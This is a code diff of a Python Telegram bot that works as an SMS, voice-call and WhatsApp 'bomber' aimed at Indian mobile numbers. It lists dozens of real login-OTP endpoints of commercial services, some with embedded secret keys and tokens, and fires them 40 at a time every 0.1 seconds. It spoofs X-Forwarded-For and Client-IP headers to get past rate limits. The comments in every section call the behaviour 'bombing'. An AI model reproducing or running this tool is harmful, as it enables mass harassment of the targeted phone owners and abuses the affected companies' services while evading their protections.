@@ -23,9 +23,9 @@ WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT            = int(os.environ.get("PORT", 8000))
 
 # FAST + CONTINUOUS CONFIG
-CONCURRENCY     = 40   # 40 requests ek saath
-DELAY           = 0.1  # 0.1 second ka gap
-REQUEST_TIMEOUT = 5    # Timeout jaldi taaki loop na ruke
+CONCURRENCY     = 40   # 40 requests ek saath (Speed wapas)
+DELAY           = 0.1  # 0.1 second ka gap (Continuous flow)
+REQUEST_TIMEOUT = 5    # Jaldi fail ho taaki loop na ruke
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -39,7 +39,7 @@ def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
 # =========================================================================
-#  A TO Z APIS (Calls Fixed)
+#  A TO Z APIS (Diljot Bomber + Tsunami Merged)
 # =========================================================================
 def build_endpoints():
     UA_C = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"
@@ -50,26 +50,26 @@ def build_endpoints():
     E = []
 
     # ==========================================
-    # 1. CALL / IVR APIS (Headers Fixed)
+    # 1. DILJOT CALL / IVR APIS
     # ==========================================
-    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com","Referer":"https://www.swiggy.com/"},"data":'{"mobile":"{t}"}'})
-    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.tatacapital.com"},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
-    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.1mg.com"},"data":'{"number":"{t}","otp_on_call":true}'})
-    E.append({"name":"Flipkart_Call","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.flipkart.com"},"data":'{"mobileNumber":"{t}"}'})
-    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D,"Referer":"https://magicpin.in/"},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
-    E.append({"name":"Refyne_IVR","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://app.refyne.co.in"},"data":'{"channel":"IVR","recipient":"{t}"}'})
-    E.append({"name":"SonyLiv_Voice","method":"POST","url":"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app_version":"3.8.3","Origin":"https://www.sonyliv.com"},"data":'{"mobileNumber":"{t}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'})
-    E.append({"name":"Snitch_Voice","method":"POST","url":"https://www.snitch.com/api/auth/resend-otp?mode=voice","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.snitch.com"},"data":'{"mobile_number":"+91{t}"}'})
-    E.append({"name":"Ixigo_Call","method":"POST","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://www.ixigo.com"},"data":'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={t}&resendOnCall=true'})
-    E.append({"name":"MMT_Call","method":"POST","url":"https://www.makemytrip.com/api/umbrella/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.makemytrip.com"},"data":'{"mobile":"{t}"}'})
-    E.append({"name":"Rapido_Call","method":"POST","url":"https://rapido.bike/api/v2/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://rapido.bike"},"data":'{"mobile":"{t}"}'})
-    E.append({"name":"Meesho_Call","method":"POST","url":"https://api.meesho.com/v2/auth/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.meesho.com"},"data":'{"phone":"{t}"}'})
-    E.append({"name":"Zomato_Call","method":"POST","url":"https://www.zomato.com/php/asyncLogin.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://www.zomato.com"},"data":'phone={t}'})
-    E.append({"name":"OYO_Call","method":"POST","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.oyorooms.com"},"data":'{"phone":"{t}"}'})
-    E.append({"name":"Astroyogi_Call","method":"POST","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.astroyogi.com","Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},"data":'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{t}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'})
+    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
+    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
+    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
+    E.append({"name":"Flipkart_Call","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
+    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
+    E.append({"name":"Refyne_IVR","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"IVR","recipient":"{t}"}'})
+    E.append({"name":"SonyLiv_Voice","method":"POST","url":"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'})
+    E.append({"name":"Snitch_Voice","method":"POST","url":"https://www.snitch.com/api/auth/resend-otp?mode=voice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_number":"+91{t}"}'})
+    E.append({"name":"Ixigo_Call","method":"POST","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={t}&resendOnCall=true'})
+    E.append({"name":"MMT_Call","method":"POST","url":"https://www.makemytrip.com/api/umbrella/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
+    E.append({"name":"Rapido_Call","method":"POST","url":"https://rapido.bike/api/v2/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
+    E.append({"name":"Meesho_Call","method":"POST","url":"https://api.meesho.com/v2/auth/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
+    E.append({"name":"Zomato_Call","method":"POST","url":"https://www.zomato.com/php/asyncLogin.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":'phone={t}'})
+    E.append({"name":"OYO_Call","method":"POST","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
+    E.append({"name":"Astroyogi_Call","method":"POST","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},"data":'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{t}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'})
 
     # ==========================================
-    # 2. WHATSAPP APIS
+    # 2. DILJOT WHATSAPP APIS
     # ==========================================
     E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
     E.append({"name":"EkaCare_WA","method":"POST","url":"https://auth.eka.care/auth/init","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
@@ -83,7 +83,7 @@ def build_endpoints():
     E.append({"name":"RegistaniaChar_WA","method":"POST","url":"https://admin.registaniachar.com/api/whatsapp/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"X-Signature":"6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},"data":'{"phone":"{t}"}'})
 
     # ==========================================
-    # 3. SMS APIS
+    # 3. DILJOT SMS APIS
     # ==========================================
     E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
     E.append({"name":"NoBroker","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
@@ -338,22 +338,15 @@ async def get_http_session() -> aiohttp.ClientSession:
 
 async def fire_endpoint(ep: dict, target: str) -> bool:
     url = ep["url"].replace("{t}", target)
-    
-    # Generate timestamp and uuid for placeholders
-    ts = str(int(time.time() * 1000))
-    u_id = uuid.uuid4().hex
-    
-    url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
-    
     spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
+    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
     headers["X-Forwarded-For"] = spoof
     headers["Client-IP"] = spoof
     headers["X-Request-Id"] = uuid.uuid4().hex
 
     data = ep["data"]
     if isinstance(data, str):
-        data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)
+        data = data.replace("{t}", target)
         
     try:
         session = await get_http_session()
@@ -417,7 +410,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     
     asyncio.create_task(run_bombing(uid, s))
 
-# ================== BOMBING LOGIC ==================
+# ================== BOMBING LOGIC (ULTRA FAST CONTINUOUS) ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     sent = 0
